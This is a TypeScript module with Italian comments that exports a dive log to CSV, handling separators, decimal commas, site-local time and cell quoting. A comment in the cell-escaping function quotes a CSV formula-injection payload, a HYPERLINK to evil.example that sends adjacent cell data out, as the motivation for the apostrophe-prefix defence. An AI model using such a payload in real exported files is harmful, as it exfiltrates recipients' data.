/**
 * L'archivio in un foglio di calcolo.
 *
 * PERCHÉ, VISTO CHE C'È GIÀ L'UDDF. Sono due domande diverse. L'UDDF serve a
 * portare le immersioni in un altro programma del settore, e per quello è il
 * formato giusto; il CSV serve a farci qualcosa che questo programma non fa —
 * una tabella pivot, un grafico strano, un conto per il club, un controllo a
 * occhio su una colonna. Un file che si apre in Excel, in Numbers e in Fogli
 * senza convertire niente non è ridondante: è l'unica strada per chi vuole i
 * propri dati e non un altro logbook.
 *
 * UNA RIGA PER IMMERSIONE, NIENTE PROFILO. Il profilo è una seconda dimensione e
 * in una tabella piatta non ci sta: metterci una riga per campione darebbe
 * quarantamila righe e nessuna delle due domande avrebbe risposta. Chi vuole i
 * campioni ha l'UDDF; chi vuole il foglio vuole il riepilogo.
 *
 * LE UNITÀ SONO QUELLE DELL'APPLICAZIONE — metri, minuti, bar, °C, L/min — e
 * stanno scritte NELL'INTESTAZIONE di ogni colonna, non in una legenda a parte:
 * un foglio di calcolo si apre sei mesi dopo, e una colonna che dice solo
 * «Profondità» costringe a indovinare.
 *
 * DUE INSIDIE DEL FORMATO, pagate qui una volta per tutte:
 *
 *  - **il separatore.** Excel in italiano legge il punto e virgola, Excel in
 *    inglese la virgola, e chi apre il file sbagliato si ritrova tutto in una
 *    colonna. Non esiste una scelta che vada bene a entrambi: si scrive la riga
 *    `sep=` in cima, che è l'unica dichiarazione che Excel legge davvero, e si
 *    lascia scegliere a chi esporta;
 *  - **i decimali.** Con il punto e virgola come separatore, un foglio italiano
 *    si aspetta anche la VIRGOLA come separatore decimale: `17.4` diventa
 *    testo, e la colonna non si somma. Le due scelte viaggiano insieme, e per
 *    questo sono un'opzione sola.
 */

import type { Dive } from '../model';
import { conditionsOf, WAVES_LABEL, WEATHER_LABEL } from '../conditions';
import { mixName } from '../units';
import { temperaturaMinimaC } from '../temperatura';
import { profonditaMedia } from '../profondita';

export interface OpzioniCsv {
  /**
   * `';'` per un foglio italiano (e decimali con la virgola), `','` per uno
   * inglese (decimali con il punto).
   */
  separatore?: ';' | ',';
  /** Le intestazioni: `'it'` o `'en'`. Il contenuto dei campi resta com'è. */
  lingua?: 'it' | 'en';
}

interface Colonna {
  it: string;
  en: string;
  /** Il valore già pronto, oppure `undefined` per lasciare la cella vuota. */
  valore: (d: Dive) => string | number | undefined;
  /**
   * Il campo che il LETTORE riconosce, quando questa colonna gli corrisponde.
   *
   * ► PERCHÉ STA QUI E NON DI LÀ. ◄ Perché è la stessa informazione, e scritta
   * in due posti diventa due informazioni che divergono. Il 15 settembre 2026
   * si è misurato dove erano già divergenti: **il CSV che questa applicazione
   * esporta, questa applicazione non lo sapeva rileggere.** L'intestazione dice
   * «Prof. max (m)» e «Durata (min)»; il lettore conosceva `max depth` e
   * `profondita max`, non `prof max`. Un giro esporta→reimporta dava zero
   * immersioni e l'avviso «colonne ignorate perché non riconosciute».
   *
   * Da qui `INTESTAZIONI_ESPORTATE` costruisce gli alias del lettore, così il
   * giro si chiude per costruzione: chi aggiunge una colonna qui la rende
   * leggibile senza doversene ricordare.
   */
  campo?: string;
}

/*
 * Le colonne, in un ordine che ha una logica: prima quello che identifica
 * l'immersione, poi quello che il computer ha misurato, poi quello che hai
 * scritto tu. Chi apre il foglio e ne guarda solo le prime otto colonne ha già
 * un logbook leggibile.
 */
const COLONNE: Colonna[] = [
  { it: 'N.', en: 'No.', valore: (d) => d.number, campo: 'number' },
  { it: 'Data', en: 'Date', valore: (d) => oreLocali(d)?.data, campo: 'date' },
  { it: 'Ora', en: 'Time', valore: (d) => oreLocali(d)?.ora, campo: 'time' },
  {
    it: 'Fuso (min)',
    en: 'UTC offset (min)',
    valore: (d) => d.utcOffsetMinutes,
  },
  { it: 'Sito', en: 'Site', valore: (d) => d.site?.name, campo: 'site' },
  { it: 'Zona', en: 'Region', valore: (d) => d.site?.region, campo: 'region' },
  { it: 'Paese', en: 'Country', valore: (d) => d.site?.country, campo: 'country' },
  { it: 'Latitudine', en: 'Latitude', valore: (d) => d.site?.lat },
  { it: 'Longitudine', en: 'Longitude', valore: (d) => d.site?.lon },
  { it: 'Titolo', en: 'Title', valore: (d) => d.title },
  { it: 'Modalità', en: 'Mode', valore: (d) => d.mode },
  {
    it: 'Durata (min)',
    en: 'Duration (min)',
    valore: (d) => arrotonda(d.durationS / 60, 1),
    campo: 'duration',
  },
  { it: 'Prof. max (m)', en: 'Max depth (m)', valore: (d) => arrotonda(d.maxDepth, 1), campo: 'maxDepth' },
  {
    it: 'Prof. media (m)',
    en: 'Avg depth (m)',
    campo: 'avgDepth',
    valore: (d) => arrotonda(profonditaMedia(d), 1),
  },
  {
    it: 'T minima (°C)',
    en: 'Min temp (°C)',
    valore: (d) => arrotonda(temperaturaMinimaC(d), 1),
    campo: 'minTemp',
  },
  { it: 'T aria (°C)', en: 'Air temp (°C)', valore: (d) => arrotonda(d.airTempC, 1), campo: 'airTemp' },
  {
    it: 'Consumo (L/min)',
    en: 'RMV (L/min)',
    valore: (d) => arrotonda(d.metrics?.rmvLpm, 1),
  },
  {
    it: 'Assetto (m/min)',
    en: 'Buoyancy (m/min)',
    valore: (d) => arrotonda(d.metrics?.bottomVerticalTravelMpm, 1),
  },
  {
    it: 'Risalita di picco (m/min)',
    en: 'Peak ascent (m/min)',
    valore: (d) => arrotonda(d.metrics?.maxAscentRateMpm, 1),
  },
  {
    it: 'Sosta di sicurezza',
    en: 'Safety stop',
    valore: (d) => (d.metrics ? (d.metrics.didSafetyStop ? 1 : 0) : undefined),
  },
  { it: 'Deco (min)', en: 'Deco (min)', valore: (d) => arrotonda((d.metrics?.decoS ?? 0) / 60, 1) },
  { it: 'GF99 uscita', en: 'GF99 on surfacing', valore: (d) => arrotonda(d.metrics?.gf99Pct, 0) },
  { it: 'CNS (%)', en: 'CNS (%)', valore: (d) => arrotonda(d.metrics?.cnsPct, 0) },
  { it: 'OTU', en: 'OTU', valore: (d) => arrotonda(d.metrics?.otu, 0) },
  { it: 'PPO2 max (bar)', en: 'Max PPO2 (bar)', valore: (d) => arrotonda(d.metrics?.maxPpo2, 2) },
  /*
   * Il gas due volte: il nome per leggere, le percentuali per contare.
   *
   * `mixName` dà «Aria», «EAN32», «Tx 21/35»: si legge bene e in un foglio non
   * si somma né si filtra per «tutte le immersioni sopra il 30% di ossigeno».
   * Le due colonne accanto sono la stessa informazione in una forma su cui il
   * foglio sa lavorare, e valgono per la prima bombola — quella con cui si è
   * fatto il fondo.
   */
  { it: 'Gas', en: 'Gas', valore: (d) => d.cylinders.map((c) => mixName(c.mix)).join(' + ') },
  /* In `GasMix` le frazioni stanno fra 0 e 1; in un foglio si legge e si filtra
     in percentuale, come è scritto sulla bombola. */
  { it: 'O2 (%)', en: 'O2 (%)', valore: (d) => percentuale(d.cylinders[0]?.mix.o2), campo: 'o2' },
  { it: 'He (%)', en: 'He (%)', valore: (d) => percentuale(d.cylinders[0]?.mix.he), campo: 'he' },
  {
    it: 'Bombola (L)',
    campo: 'tankSize',
    en: 'Cylinder (L)',
    valore: (d) => arrotonda(d.cylinders[0]?.sizeL, 1),
  },
  {
    it: 'Pressione iniziale (bar)',
    campo: 'startBar',
    en: 'Start pressure (bar)',
    valore: (d) => arrotonda(d.cylinders[0]?.startBar, 0),
  },
  {
    it: 'Pressione finale (bar)',
    campo: 'endBar',
    en: 'End pressure (bar)',
    valore: (d) => arrotonda(d.cylinders[0]?.endBar, 0),
  },
  { it: 'Acqua', en: 'Water', valore: (d) => d.salinity },
  { it: 'Zavorra (kg)', en: 'Weight (kg)', valore: (d) => arrotonda(d.weightKg, 1), campo: 'weight' },
  { it: 'Muta', en: 'Wetsuit', valore: (d) => d.gear?.suit?.name ?? d.suit, campo: 'suit' },
  { it: 'GAV', en: 'BCD', valore: (d) => d.gear?.bcd?.name },
  {
    it: 'Erogatori',
    en: 'Regulators',
    valore: (d) => d.gear?.regulators?.map((r) => r.name).join(' + '),
  },
  { it: 'Compagno', en: 'Buddy', valore: (d) => d.buddy, campo: 'buddy' },
  { it: 'Guida', en: 'Dive guide', valore: (d) => d.guide },
  { it: 'Voto', en: 'Rating', valore: (d) => d.rating, campo: 'rating' },
  {
    it: 'Visibilità (m)',
    campo: 'visibility',
    en: 'Visibility (m)',
    valore: (d) =>
      d.visibilityMaxM !== undefined && d.visibilityM !== undefined
        ? `${d.visibilityM}–${d.visibilityMaxM}`
        : d.visibilityM,
  },
  { it: 'Mare', en: 'Sea', valore: (d) => etichettaMare(d) },
  { it: 'Meteo', en: 'Weather', valore: (d) => etichettaMeteo(d) },
  { it: 'Etichette', en: 'Tags', valore: (d) => d.tags.join(' '), campo: 'tags' },
  { it: 'Computer', en: 'Computer', valore: (d) => d.computer?.model },
  { it: 'Provenienza', en: 'Source', valore: (d) => provenienza(d) },
  { it: 'Note', en: 'Notes', valore: (d) => d.notes, campo: 'notes' },
];

/**
 * Data e ora NEL FUSO DEL SITO, come ovunque nel resto dell'applicazione.
 *
 * ► COSA USCIVA PRIMA. ◄ `d.startTime.slice(0, 10)` e `.slice(11, 16)`: i
 * caratteri dell'istante ISO, cioè l'ora **UTC**. Un'immersione delle 08:00 a
 * UTC+14 usciva nel foglio come `2026-03-14 18:00` mentre il logbook, il PDF e
 * il libretto della stessa immersione dicevano `15/03/2026 08:00`: non un'ora
 * diversa — **un giorno diverso**. Chi somma le immersioni per mese, chi cerca
 * «il tuffo di sabato» o chi confronta il foglio con la scheda stampata trova
 * due verità, e nessuna delle due dice di essere in un fuso.
 *
 * Lo spostamento è quello di `ui/format.ts` e di `core/libretto.ts`: si somma
 * l'offset all'istante e poi si legge in UTC, che è l'unico modo di rivedere
 * l'ora che il computer al polso segnava. Senza `utcOffsetMinutes` non si sa e
 * si resta su UTC — la stessa scelta dichiarata dal resto dell'app, e il valore
 * sta comunque nella colonna «Fuso (min)» qui accanto, così il foglio resta
 * leggibile senza indovinare.
 */
function oreLocali(d: Dive): { data: string; ora: string } | undefined {
  const istante = Date.parse(d.startTime);
  if (Number.isNaN(istante)) return undefined;
  const spostato = new Date(istante + (d.utcOffsetMinutes ?? 0) * 60_000);
  const due = (v: number) => String(v).padStart(2, '0');
  return {
    // La data resta in forma ISO: è quella che ogni foglio di calcolo riconosce
    // come data in qualunque lingua sia impostato.
    data: `${spostato.getUTCFullYear()}-${due(spostato.getUTCMonth() + 1)}-${due(spostato.getUTCDate())}`,
    ora: `${due(spostato.getUTCHours())}:${due(spostato.getUTCMinutes())}`,
  };
}

function etichettaMare(d: Dive): string | undefined {
  const w = conditionsOf(d).waves;
  return w ? WAVES_LABEL[w] : undefined;
}

function etichettaMeteo(d: Dive): string | undefined {
  const w = conditionsOf(d).weather;
  return w ? WEATHER_LABEL[w] : undefined;
}

/**
 * Da dove viene l'immersione, con tutte le fonti che l'hanno costruita.
 *
 * Non è un dettaglio da archivisti: in un foglio dove le colonne dei gas sono
 * vuote per metà, sapere che quella riga è arrivata da un CSV di riepilogo e
 * non da un computer spiega il vuoto invece di farlo sembrare un difetto.
 *
 * Escono gli identificativi del formato (`uddf`, `garmin-fit`) e non le
 * etichette leggibili: quelle stanno in `ui/format.ts`, e `src/core` non
 * conosce l'interfaccia — è il vincolo su cui è costruito tutto il progetto.
 * Non è nemmeno una perdita: in un foglio di calcolo un valore stabile e
 * uguale in ogni lingua si filtra e si raggruppa, un'etichetta tradotta no.
 */
function provenienza(d: Dive): string {
  const tutte = [d.source, ...(d.extraSources ?? [])];
  return [...new Set(tutte.map((s) => s.format))].join(' + ');
}

function percentuale(frazione: number | undefined): number | undefined {
  return frazione === undefined ? undefined : arrotonda(frazione * 100, 1);
}

function arrotonda(v: number | undefined, cifre: number): number | undefined {
  if (v === undefined || !Number.isFinite(v)) return undefined;
  return Number(v.toFixed(cifre));
}

/**
 * Una cella, protetta da quello che ci può finire dentro.
 *
 * Il nome di un sito contiene virgolette, il nome di un compagno un punto e
 * virgola, e una nota contiene un a capo — che in un CSV chiude la riga. La
 * regola di RFC 4180 è una sola: se la cella contiene il separatore, una
 * virgoletta o un a capo, si racchiude fra virgolette e si raddoppiano quelle
 * interne.
 *
 * Il numero ha un percorso separato per via del separatore decimale: con il
 * punto e virgola si scrive con la virgola, altrimenti col punto. Un numero
 * scritto con il separatore sbagliato entra nel foglio come TESTO, e la colonna
 * non si somma — un difetto che non dà nessun errore e che si scopre alla fine.
 */
function cella(v: string | number | undefined, sep: ';' | ',', virgolaDecimale: boolean): string {
  if (v === undefined || v === null || v === '') return '';
  if (typeof v === 'number') {
    const testo = String(v);
    return virgolaDecimale ? testo.replace('.', ',') : testo;
  }
  /*
   * ════════════════════════════════════════════════════════════════════════
   * ► UNA CELLA CHE COMINCIA PER `=` È UNA FORMULA, E LE VIRGOLETTE NON
   *   PROTEGGONO. ◄
   *
   * Excel, Numbers e Fogli tolgono le virgolette del CSV e POI guardano il
   * primo carattere: `=`, `+`, `-`, `@` e la tabulazione aprono una formula.
   * Questo file è pensato per essere aperto in un foglio di calcolo e mandato
   * al club, quindi il percorso è completo: un logbook ricevuto da un compagno
   * diventa un vettore.
   *
   * Misurato il 15 settembre 2026 importando un UDDF ostile e riesportandolo:
   * il nome del sito usciva come
   * `"=HYPERLINK(""http://evil.example/?d=""&A1,""Clicca"")"` — cioè una
   * formula che, aperto il file, porta fuori le celle vicine.
   *
   * L'apostrofo davanti è il modo che i fogli di calcolo capiscono per dire
   * «questo è testo»: non compare a schermo e non entra in una riesportazione,
   * perché il lettore CSV di questa applicazione lo toglie.
   *
   * (Il KML faceva già la cosa giusta con `&quot;`: era il CSV a essere rimasto
   * indietro.)
   */
  const testo = String(v);
  const formula = /^[=+\-@\t\r]/.test(testo);
  if (formula) return `"'${testo.replace(/"/g, '""')}"`;
  if (testo.includes(sep) || testo.includes('"') || /[\r\n]/.test(testo)) {
    return `"${testo.replace(/"/g, '""')}"`;
  }
  return testo;
}

export interface RisultatoCsv {
  csv: string;
  righe: number;
}

/**
 * L'archivio in CSV, una riga per immersione.
 *
 * Le immersioni escono nell'ordine in cui arrivano: chi chiama ha già l'elenco
 * ordinato come lo vede a schermo, e riordinare qui vorrebbe dire che il file
 * non corrisponde a quello che aveva davanti.
 */
export function esportaCsv(dives: Dive[], opzioni: OpzioniCsv = {}): RisultatoCsv {
  const sep = opzioni.separatore ?? ';';
  const virgolaDecimale = sep === ';';
  const lingua = opzioni.lingua ?? 'it';

  /*
   * `sep=` in cima, e il BOM davanti.
   *
   * `sep=;` è una riga che Excel legge e che gli altri fogli ignorano: senza,
   * Excel usa il separatore della lingua del sistema e chi ha scelto l'altro si
   * ritrova tutto in una colonna. Il BOM UTF-8 è l'altra metà dello stesso
   * problema: senza, Excel su Windows legge il file come Latin-1 e «Moregallo»
   * resta leggibile ma «immersione di 25 °C» no.
   */
  const righe = [`sep=${sep}`, COLONNE.map((c) => cella(c[lingua], sep, false)).join(sep)];
  for (const d of dives) {
    righe.push(COLONNE.map((c) => cella(c.valore(d), sep, virgolaDecimale)).join(sep));
  }
  return { csv: '﻿' + righe.join('\r\n') + '\r\n', righe: dives.length };
}

/**
 * LE INTESTAZIONI CHE QUESTO FILE SCRIVE, per campo del lettore.
 *
 * Il lettore CSV la mescola ai suoi alias, così il giro esporta→reimporta si
 * chiude per costruzione invece che per attenzione. *Due copie della stessa
 * regola sono una regola e la sua versione vecchia.*
 */
export const INTESTAZIONI_ESPORTATE: Record<string, string[]> = Object.fromEntries(
  [...new Set(COLONNE.map((c) => c.campo).filter(Boolean))].map((campo) => [
    campo as string,
    COLONNE.filter((c) => c.campo === campo).flatMap((c) => [c.it, c.en]),
  ]),
);
